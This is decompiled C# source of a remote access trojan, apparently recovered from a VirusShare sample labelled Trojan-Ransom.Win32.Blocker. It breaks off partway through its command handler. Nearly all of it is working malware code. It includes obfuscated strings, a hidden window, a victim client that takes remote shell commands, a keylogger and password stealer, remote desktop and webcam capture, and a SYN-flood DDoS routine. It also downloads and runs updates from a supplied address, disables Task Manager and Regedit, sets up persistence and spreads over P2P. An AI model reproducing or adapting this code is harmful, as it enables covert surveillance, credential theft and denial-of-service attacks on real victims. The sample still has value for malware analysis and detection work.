// Decompiled with JetBrains decompiler
// Type: OpenSource_RAT_Schäding.Form1
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8170AD08-ABA5-4012-BCC7-4CC67D0071A1
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00015-msil\Trojan-Ransom.Win32.Blocker.ikxa-53f746507d13e73a4ea2419189ad7b0070faaf51b1e13192df858b42ac6c25c0.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;
using OpenSource_RAT_Schäding.My;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.ServiceProcess;
using System.Threading;
using System.Windows.Forms;

namespace OpenSource_RAT_Schäding
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    [AccessedThroughProperty("TextBox1")]
    private TextBox _TextBox1;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer _Timer1;
    [AccessedThroughProperty("Timer2")]
    private System.Windows.Forms.Timer _Timer2;
    private Module1.ShowDeskInListview ShowScreenInListview;
    [AccessedThroughProperty("AktuellesFenster")]
    private Module1.AktuellesFensterauslesen _AktuellesFenster;
    [AccessedThroughProperty("Client")]
    private VictimCLient _Client;
    [AccessedThroughProperty("ShellKonsole")]
    private Module1.ShellKonsole _ShellKonsole;
    [AccessedThroughProperty("Keylogger")]
    private Module1.Keylogger _Keylogger;
    [AccessedThroughProperty("Socks5Manager")]
    private Module1.Socks5Handler _Socks5Manager;
    private Module1.RemoteDesktop RemoteDesktop;
    private Module1.RemoteWebcam RemoteWebcam;
    private Module1.PasswortStealer Passwortstealer;
    private Module1.OfflineKeylogger OfKeylogger;
    [AccessedThroughProperty("FunFunktionen")]
    private FunFunktionen _FunFunktionen;
    public Mutex m;
    [AccessedThroughProperty("DateiSuche")]
    private Module1.DateiSuche _DateiSuche;

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.FormClosing += new FormClosingEventHandler(this.Form1_FormClosing);
      this.ShowScreenInListview = new Module1.ShowDeskInListview();
      this.AktuellesFenster = new Module1.AktuellesFensterauslesen();
      this.Client = new VictimCLient();
      this.ShellKonsole = new Module1.ShellKonsole();
      this.Keylogger = new Module1.Keylogger();
      this.Socks5Manager = new Module1.Socks5Handler();
      this.RemoteDesktop = new Module1.RemoteDesktop();
      this.RemoteWebcam = new Module1.RemoteWebcam();
      this.Passwortstealer = new Module1.PasswortStealer();
      this.OfKeylogger = new Module1.OfflineKeylogger();
      this.FunFunktionen = new FunFunktionen();
      this.DateiSuche = new Module1.DateiSuche();
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.TextBox1 = new TextBox();
      this.Timer1 = new System.Windows.Forms.Timer(this.components);
      this.Timer2 = new System.Windows.Forms.Timer(this.components);
      this.SuspendLayout();
      this.TextBox1.Font = new Font(\u003F0\u003F.\u003F1\u003F("Yźɱͣѿռ١ݫ\u0878फਖ਼୨౦\u0D74ฦབၡᅱቫ፧"), 6.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.TextBox1.Location = new Point(12, 12);
      this.TextBox1.Multiline = true;
      this.TextBox1.Name = \u003F0\u003F.\u003F1\u003F("\\Ţɾͱцլٺܰ");
      TextBox textBox1 = this.TextBox1;
      Size size1 = new Size(347, 215);
      Size size2 = size1;
      textBox1.Size = size2;
      this.TextBox1.TabIndex = 0;
      this.TextBox1.Text = componentResourceManager.GetString(\u003F0\u003F.\u003F1\u003F("Yũɳ;ыէٿܷࠫॐ੦\u0B7A\u0C75"));
      this.Timer1.Interval = 200;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(371, 238);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.TextBox1);
      this.FormBorderStyle = FormBorderStyle.None;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = \u003F0\u003F.\u003F1\u003F("Cūɱͯа");
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.WindowState = FormWindowState.Minimized;
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual TextBox TextBox1
    {
      [DebuggerNonUserCode] get => this._TextBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox1 = value;
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      [DebuggerNonUserCode] get => this._Timer1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        if (this._Timer1 != null)
          goto label_2;
label_1:
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += eventHandler;
        return;
label_2:
        this._Timer1.Tick -= eventHandler;
        goto label_1;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer2
    {
      [DebuggerNonUserCode] get => this._Timer2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer2_Tick);
        if (this._Timer2 != null)
          goto label_2;
label_1:
        this._Timer2 = value;
        if (this._Timer2 == null)
          return;
        this._Timer2.Tick += eventHandler;
        return;
label_2:
        this._Timer2.Tick -= eventHandler;
        goto label_1;
      }
    }

    private virtual Module1.AktuellesFensterauslesen AktuellesFenster
    {
      [DebuggerNonUserCode] get => this._AktuellesFenster;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        Module1.AktuellesFensterauslesen.NeuesFensterEventHandler fensterEventHandler = new Module1.AktuellesFensterauslesen.NeuesFensterEventHandler(this.AktuellesFenster_NeuesFenster);
        if (this._AktuellesFenster != null)
          goto label_2;
label_1:
        this._AktuellesFenster = value;
        if (this._AktuellesFenster == null)
          return;
        this._AktuellesFenster.NeuesFenster += fensterEventHandler;
        return;
label_2:
        this._AktuellesFenster.NeuesFenster -= fensterEventHandler;
        goto label_1;
      }
    }

    public virtual VictimCLient Client
    {
      [DebuggerNonUserCode] get => this._Client;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        VictimCLient.OnReconnectEventHandler reconnectEventHandler = new VictimCLient.OnReconnectEventHandler(this.Client_OnReconnect);
        VictimCLient.OnConnectEventHandler connectEventHandler = new VictimCLient.OnConnectEventHandler(this.Client_OnConnect);
        VictimCLient.NewMessageEventHandler messageEventHandler = new VictimCLient.NewMessageEventHandler(this.Client_NewMessage);
        if (this._Client != null)
          goto label_2;
label_1:
        this._Client = value;
        if (this._Client == null)
          return;
        this._Client.OnReconnect += reconnectEventHandler;
        this._Client.OnConnect += connectEventHandler;
        this._Client.NewMessage += messageEventHandler;
        return;
label_2:
        this._Client.OnReconnect -= reconnectEventHandler;
        this._Client.OnConnect -= connectEventHandler;
        this._Client.NewMessage -= messageEventHandler;
        goto label_1;
      }
    }

    private virtual Module1.ShellKonsole ShellKonsole
    {
      [DebuggerNonUserCode] get => this._ShellKonsole;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        Module1.ShellKonsole.ShellAnswerEventHandler answerEventHandler = new Module1.ShellKonsole.ShellAnswerEventHandler(this.ShellKonsole_ShellAnswer);
        if (this._ShellKonsole != null)
          goto label_2;
label_1:
        this._ShellKonsole = value;
        if (this._ShellKonsole == null)
          return;
        this._ShellKonsole.ShellAnswer += answerEventHandler;
        return;
label_2:
        this._ShellKonsole.ShellAnswer -= answerEventHandler;
        goto label_1;
      }
    }

    private virtual Module1.Keylogger Keylogger
    {
      [DebuggerNonUserCode] get => this._Keylogger;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        Module1.Keylogger.NewOnlineKeyLoggsEventHandler loggsEventHandler = new Module1.Keylogger.NewOnlineKeyLoggsEventHandler(this.Keylogger_NewOnlineKeyLoggs);
        if (this._Keylogger != null)
          goto label_2;
label_1:
        this._Keylogger = value;
        if (this._Keylogger == null)
          return;
        this._Keylogger.NewOnlineKeyLoggs += loggsEventHandler;
        return;
label_2:
        this._Keylogger.NewOnlineKeyLoggs -= loggsEventHandler;
        goto label_1;
      }
    }

    private virtual Module1.Socks5Handler Socks5Manager
    {
      [DebuggerNonUserCode] get => this._Socks5Manager;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        Module1.Socks5Handler.SendTextEventHandler textEventHandler = new Module1.Socks5Handler.SendTextEventHandler(this.Socks5Manager_SendText);
        if (this._Socks5Manager != null)
          goto label_2;
label_1:
        this._Socks5Manager = value;
        if (this._Socks5Manager == null)
          return;
        this._Socks5Manager.SendText += textEventHandler;
        return;
label_2:
        this._Socks5Manager.SendText -= textEventHandler;
        goto label_1;
      }
    }

    private virtual FunFunktionen FunFunktionen
    {
      [DebuggerNonUserCode] get => this._FunFunktionen;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        FunFunktionen.ChatMSGEventHandler chatMsgEventHandler = new FunFunktionen.ChatMSGEventHandler(this.FunFunktionen_ChatMSG);
        if (this._FunFunktionen != null)
          goto label_2;
label_1:
        this._FunFunktionen = value;
        if (this._FunFunktionen == null)
          return;
        this._FunFunktionen.ChatMSG += chatMsgEventHandler;
        return;
label_2:
        this._FunFunktionen.ChatMSG -= chatMsgEventHandler;
        goto label_1;
      }
    }

    private virtual Module1.DateiSuche DateiSuche
    {
      [DebuggerNonUserCode] get => this._DateiSuche;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        Module1.DateiSuche.DateiGefundenEventHandler gefundenEventHandler = new Module1.DateiSuche.DateiGefundenEventHandler(this.DateiSuche_DateiGefunden);
        if (this._DateiSuche != null)
          goto label_2;
label_1:
        this._DateiSuche = value;
        if (this._DateiSuche == null)
          return;
        this._DateiSuche.DateiGefunden += gefundenEventHandler;
        return;
label_2:
        this._DateiSuche.DateiGefunden -= gefundenEventHandler;
        goto label_1;
      }
    }

    private void Form1_FormClosing(object sender, FormClosingEventArgs e)
    {
      try
      {
        Module1.CriticalProzess.ProtectProcess(false);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      this.Timer1.Stop();
      try
      {
        Process[] processesByName = Process.GetProcessesByName(\u003F0\u003F.\u003F1\u003F("vŲɹ"));
        int index = 0;
        while (index < processesByName.Length)
        {
          processesByName[index].Kill();
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        MyProject.Computer.FileSystem.DeleteFile(Interaction.Environ(\u003F0\u003F.\u003F1\u003F("fŶɵ͠Ѣն٠")) + \u003F0\u003F.\u003F1\u003F("TŲɶͽЪզٺݤ"));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        MyProject.Computer.FileSystem.DeleteFile(Interaction.Environ(\u003F0\u003F.\u003F1\u003F("pŦɯͱ")) + \u003F0\u003F.\u003F1\u003F("TŲɶͽЪզٺݤ"));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      try
      {
        this.Visible = false;
        this.Hide();
        if (!Module2.DDebug)
          Module1.StubStringEinlesen();
        else
          Module2.VerbindungsDaten.Add(new Module2.VerbindungsInformationen()
          {
            IpAdresse = \u003F0\u003F.\u003F1\u003F("8ĺǪ̇̄еԪسܬ࠰"),
            TransferPort = 8881,
            ConnectPort = 8888
          });
        if (Module2.Antis)
          this.Timer2.Start();
        if (Module1.ServerInstallation())
        {
          this.Client.Start();
          if (Module2.OffKeylogger)
            this.OfKeylogger.Start();
          if (Module2.Persistenz)
          {
            try
            {
              Process[] processesByName = Process.GetProcessesByName(\u003F0\u003F.\u003F1\u003F("vŲɹ"));
              int index = 0;
              while (index < processesByName.Length)
              {
                processesByName[index].Kill();
                checked { ++index; }
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            try
            {
              MyProject.Computer.FileSystem.DeleteFile(Interaction.Environ(\u003F0\u003F.\u003F1\u003F("fŶɵ͠Ѣն٠")) + \u003F0\u003F.\u003F1\u003F("TŲɶͽЪզٺݤ"));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            try
            {
              MyProject.Computer.FileSystem.DeleteFile(Interaction.Environ(\u003F0\u003F.\u003F1\u003F("pŦɯͱ")) + \u003F0\u003F.\u003F1\u003F("TŲɶͽЪզٺݤ"));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            this.Timer1.Start();
          }
        }
        else
          Application.Exit();
        if (!Module2.P2PSpread)
          return;
        Module1.Spread.P2pSpread();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Application.Exit();
        ProjectData.ClearProjectError();
      }
    }

    private void AktuellesFenster_NeuesFenster(string Titel)
    {
      try
      {
        this.Keylogger.AktuellesFenster = Titel;
        this.OfKeylogger.AktuellesFenster = Titel;
        this.Client.Senden(\u003F0\u003F.\u003F1\u003F("UŸɦͤѵգ٢ݨ\u087F्੯୧\u0C7B\u0D73\u0E63ཷဧᄨሩጢ") + Titel);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Client_NewMessage(string[] Befehle)
    {
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("gŬɲ\u0378"), false) == 0)
      {
        try
        {
          MyProject.Computer.FileSystem.CopyFile(Befehle[1], Befehle[2]);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("WŪɺ͎Ѡբٺݫ\u0867०ੴୡ\u0C50൦\u0E7Aཱུ"), false) == 0)
      {
        try
        {
          this.Client.Senden(Clipboard.GetText());
          Process process = new Process();
          object mainWindowHandle = (object) Process.GetProcessesByName(\u003F0\u003F.\u003F1\u003F(""))[0].MainWindowHandle;
          int num = (int) Interaction.MsgBox((object) Clipboard.GetText());
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          int num = (int) Interaction.MsgBox((object) ex.Message);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("KŤɨͥѮՐ٢ݱ\u086A"), false) == 0)
      {
        try
        {
          if (Operators.CompareString(Befehle[1], \u003F0\u003F.\u003F1\u003F("0"), false) == 0)
            this.FunFunktionen.DisableTaskmanager(true);
          else
            this.FunFunktionen.DisableTaskmanager(false);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("JūɩͦѯՑ٧ݦ"), false) == 0)
      {
        try
        {
          if (Operators.CompareString(Befehle[1], \u003F0\u003F.\u003F1\u003F("0"), false) == 0)
            this.FunFunktionen.DisableRegedit(true);
          else
            this.FunFunktionen.DisableRegedit(false);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("AũɶͰѰՁ٭ݹ"), false) == 0)
      {
        try
        {
          this.FunFunktionen.InputChatBox(Befehle[1], Befehle[2]);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("^Źɻͯѻ՛پݨࡖ॰\u0A62୰\u0C75"), false) == 0)
      {
        try
        {
          if (!Syn.IsEnabled)
            Syn.StopSuperSyn();
          Syn.Host = Befehle[1];
          Syn.Port = Conversions.ToInteger(Befehle[2]);
          Syn.SuperSynSockets = Conversions.ToInteger(Befehle[3]);
          Syn.Threads = Conversions.ToInteger(Befehle[4]);
          Syn.StartSuperSyn();
          Syn.DDOSStatus = \u003F0\u003F.\u003F1\u003F("[űȵ̮ўյ٥ܪࡏ।੨୩ౡത\u0E62ཷၧ") + Syn.Host + \u003F0\u003F.\u003F1\u003F(",") + Conversions.ToString(Syn.Port) + \u003F0\u003F.\u003F1\u003F(",") + Conversions.ToString(Syn.SuperSynSockets) + \u003F0\u003F.\u003F1\u003F(",") + Conversions.ToString(Syn.Threads);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("^ŵɥ͌ѥէ٨ݢࡖ॰੬\u0B72\u0C71"), false) == 0)
      {
        try
        {
          Syn.StopSuperSyn();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("RŸɮ͠Ѫթٝݣ\u086Aॼ੮୫౫൫\u0E77ཫၻ"), false) == 0)
      {
        try
        {
          MySettingsProperty.Settings.VictimNotiz = Befehle[1];
          MySettingsProperty.Settings.Save();
          this.Client.Senden(\u003F0\u003F.\u003F1\u003F("Yŧɮ\u0378Ѣէهݧ\u0873९\u0A7Fଧనഩย") + MySettingsProperty.Settings.VictimNotiz);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("\\Źɥͳѭմٵݩ\u086D॰\u0A76\u0B64"), false) == 0)
      {
        try
        {
          string Text = \u003F0\u003F.\u003F1\u003F("_żɢͶѮչٺݤ\u086Eॵੱୡహഹ\u0E3B");
          Process[] processes = Process.GetProcesses();
          int index = 0;
          while (index < processes.Length)
          {
            Process process = processes[index];
            try
            {
              Text = Text + process.ProcessName + \u003F0\u003F.\u003F1\u003F("}ĩɿ") + process.Id.ToString() + \u003F0\u003F.\u003F1\u003F("}ĩɿ") + process.MainWindowTitle + \u003F0\u003F.\u003F1\u003F("}ĩɿ") + process.MainModule.FileName + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢");
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            checked { ++index; }
          }
          this.Client.Senden(Text);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("Gŭɰ̀Ѫը٧ݧ\u0873"), false) == 0)
      {
        try
        {
          if (!MyProject.Computer.FileSystem.DirectoryExists(Befehle[1]))
            MyProject.Computer.FileSystem.CreateDirectory(Befehle[1]);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("aŠɤͫрժ٨ݧ\u0867ॳ"), false) == 0)
      {
        try
        {
          if (MyProject.Computer.FileSystem.DirectoryExists(Befehle[1]))
            MyProject.Computer.FileSystem.DeleteDirectory(Befehle[1], DeleteDirectoryOption.DeleteAllContents);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("@ţɥͤїմ٪ݾ\u0866ॱੲ"), false) == 0)
      {
        try
        {
          Process.GetProcessById(Conversions.ToInteger(Befehle[1])).Kill();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("NŨɼ͢ѯՖٱݠ\u086A।"), false) == 0)
      {
        try
        {
          this.DateiSuche.Start(Befehle[1], Befehle[2]);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("_žɩ͡ѭՔٲݪ\u0874ॳ੧୯"), false) == 0)
      {
        try
        {
          this.DateiSuche.Stopp();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("{ŷɴ͠ѧի٧ݯ"), false) == 0)
      {
        try
        {
          Module1.Sprechen(Befehle[1]);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("MŬɼ͗ѯզٰݶ\u0870।"), false) == 0)
      {
        try
        {
          Module2.VictimID = Befehle[2];
          string str = Befehle[1];
          new Module1.ImagePreview() { Pfad = str }.StartDesktopCapture();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("DŢɭͥѻե٦ݲ\u086C५੭୧౯"), false) == 0)
      {
        try
        {
          this.Client.Senden(\u003F0\u003F.\u003F1\u003F("Xžɩ͡ѿա٪ݾ\u0860१੩ୣ౫ധศ༩ဢ") + Module2._Ipadresse + \u003F0\u003F.\u003F1\u003F("zĨɼ̯") + Module2._ConnectionPort.ToString() + \u003F0\u003F.\u003F1\u003F("zĨɼ̯") + Module2._TransferPort.ToString() + \u003F0\u003F.\u003F1\u003F("zĨɼ̯") + Module2.Passwort + \u003F0\u003F.\u003F1\u003F("zĨɼ̯") + Module2.ReconnectTime.ToString() + \u003F0\u003F.\u003F1\u003F("zĨɼ̯") + Module2.ServerInstallieren.ToString() + \u003F0\u003F.\u003F1\u003F("zĨɼ̯") + Module2.Autostart_CurrentUser.ToString() + \u003F0\u003F.\u003F1\u003F("zĨɼ̯") + Module2.Autostart_LocalMashine.ToString() + \u003F0\u003F.\u003F1\u003F("zĨɼ̯") + Module2.Autostart_AxtivX.ToString() + \u003F0\u003F.\u003F1\u003F("zĨɼ̯") + Module2.MutexString + \u003F0\u003F.\u003F1\u003F("zĨɼ̯") + Module2.Attribut_Versteckt.ToString() + \u003F0\u003F.\u003F1\u003F("zĨɼ̯") + Conversions.ToString(Module2.Melt) + \u003F0\u003F.\u003F1\u003F("zĨɼ̯") + Module2.SystemProzessSetzen.ToString() + \u003F0\u003F.\u003F1\u003F("zĨɼ̯") + Module2.Persistenz.ToString() + \u003F0\u003F.\u003F1\u003F("zĨɼ̯") + Module2.UAC_Deaktivieren.ToString() + \u003F0\u003F.\u003F1\u003F("zĨɼ̯") + Module2.P2PSpread.ToString() + \u003F0\u003F.\u003F1\u003F("zĨɼ̯") + Module2.Antis.ToString() + \u003F0\u003F.\u003F1\u003F("zĨɼ̯") + Module2.ErrorMessage.ToString() + \u003F0\u003F.\u003F1\u003F("zĨɼ̯") + Module2.ErrorMessageTitel + \u003F0\u003F.\u003F1\u003F("zĨɼ̯") + Module2.ErrorMessageText + \u003F0\u003F.\u003F1\u003F("zĨɼ̯"));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("YŽɩ͵ѲՖ٬ݦ\u086E७"), false) == 0)
      {
        try
        {
          this.ShellKonsole.Start();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("YŽɧͷѶՖ٬ݦ\u086E७"), false) == 0)
      {
        try
        {
          this.ShellKonsole.Stopp();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("Xżɯͫѽխفݴ\u086A३\u0A56\u0B50్"), false) == 0)
      {
        try
        {
          string address = Befehle[1];
          try
          {
            MyProject.Computer.FileSystem.DeleteFile(Interaction.Environ(\u003F0\u003F.\u003F1\u003F("pŦɯͱ")) + \u003F0\u003F.\u003F1\u003F("VűɰͲѶաتݦ\u087A।"));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          MyProject.Computer.Network.DownloadFile(address, Interaction.Environ(\u003F0\u003F.\u003F1\u003F("pŦɯͱ")) + \u003F0\u003F.\u003F1\u003F("VűɰͲѶաتݦ\u087A।"));
          Module1.UpdateFromFile();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("TŠɩͬѴդ"), false) == 0)
      {
        this.Timer1.Stop();
        if (Module2.Persistenz)
        {
          try
          {
            Process[] processesByName = Process.GetProcessesByName(\u003F0\u003F.\u003F1\u003F("vŲɹ"));
            int index = 0;
            while (index < processesByName.Length)
            {
              processesByName[index].Kill();
              checked { ++index; }
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            MyProject.Computer.FileSystem.DeleteFile(Interaction.Environ(\u003F0\u003F.\u003F1\u003F("fŶɵ͠Ѣն٠")) + \u003F0\u003F.\u003F1\u003F("TŲɶͽЪզٺݤ"));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            MyProject.Computer.FileSystem.DeleteFile(Interaction.Environ(\u003F0\u003F.\u003F1\u003F("pŦɯͱ")) + \u003F0\u003F.\u003F1\u003F("TŲɶͽЪզٺݤ"));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        Module1.ServerLöschen();
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("XŢɬͤѫդ٠ݢ\u0866४੭"), false) == 0)
      {
        try
        {
          this.ShellKonsole.Schreiben(Befehle[1]);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("Wŷɢͻѻաٽݏ\u086Aॺ\u0A7D\u0B7D\u0C75ൣ๖\u0F70ၢᅰት"), false) == 0)
      {
        try
        {
          Module2.VictimID = Befehle[1];
          this.RemoteDesktop.Start();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("Wŷɢͻѻաٽݏ\u086Aॺ\u0A7D\u0B7D\u0C75ൣ๖\u0F70ၬᅲቱ"), false) == 0)
      {
        try
        {
          this.RemoteDesktop.Stopp();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("Cŵɢ͡ѹթُݯ\u087Aॣੳ୩\u0C75ൂ\u0E62ཱၵ"), false) == 0)
      {
        try
        {
          this.RemoteDesktop.Geschwindigkeit = Conversions.ToInteger(Befehle[1]);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("@Ŵɽ͠Ѻըوݮ\u0879ॢ\u0A7C୨\u0C76\u0D54\u0E71རၮᅨ"), false) == 0)
      {
        try
        {
          this.RemoteDesktop.Qualität = Conversions.ToInteger(Befehle[1]);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("Cŵɢ͡ѹթٜݯ\u086B५੦୫ౖ\u0D70\u0E62\u0F70ၵ"), false) == 0)
      {
        try
        {
          Module2.VictimID = Befehle[1];
          this.RemoteWebcam.WebCamID = Conversions.ToInteger(Befehle[2]);
          this.RemoteWebcam.Start();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("HŸɬͩѳՕ٪ݧ\u0868ॱ\u0A34"), false) == 0)
      {
        try
        {
          this.Socks5Manager.NewSocks5(Conversions.ToInteger(Befehle[1]));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("Cŵɢ͡ѹթٜݯ\u086B५੦୫ౖ\u0D70\u0E6Cིၱ"), false) == 0)
      {
        try
        {
          this.RemoteWebcam.Stopp();
        }
        catch (Exception ex)
        {
